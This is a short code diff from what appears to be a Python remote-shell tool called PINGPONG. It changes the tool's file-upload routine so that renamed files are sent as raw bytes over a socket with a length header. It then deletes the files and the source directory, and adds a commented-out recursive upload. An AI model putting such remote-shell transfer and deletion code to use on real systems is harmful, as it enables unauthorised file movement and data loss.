@@ -90,7 +90,7 @@ def PINGPONG_shell(conn, addr, ip, port, printf, AUTOCOMMAND, op_ac):
                         old_n = os.path.join(path, file)
                         new_name = file + ".txt"
                         os.rename(old_n, new_name)
-                        with open(new_name, "r") as f:
+                        with open(new_name, "rb") as f:
                             se_data = f.read()
                             conn.send(bytes(new_name, "utf8"))
                             name_data = conn.recv(1024)
@@ -98,7 +98,14 @@ def PINGPONG_shell(conn, addr, ip, port, printf, AUTOCOMMAND, op_ac):
                                 time.sleep(1)
                                 if name_data:
                                     break
-                            conn.sendall(bytes(se_data, 'utf8'))
+                            len_data = len(se_data)
+                            conn.send(bytes(str(len_data), "utf8"))
+                            len_recv = conn.recv(1024)
+                            while True:
+                                time.sleep(1)
+                                if len_recv:
+                                    break
+                            conn.sendall(se_data)
                             upload_data = conn.recv(1024)
                             while True:
                                 time.sleep(1)
@@ -148,6 +155,9 @@ def PINGPONG_shell(conn, addr, ip, port, printf, AUTOCOMMAND, op_ac):
                         os.remove(new_name)
                     except:
                         pass
+            # for check_d in file_names:
+            #     if os.path.isdir(check_d):
+            #         Upload(os.path.join(file_dir + check_d), os.path.join(to_dir + check_d))
             shutil.rmtree(path)
         except:
             restart = input("PINGPONG>[-]Something went WRONG, restart?[y/n]")
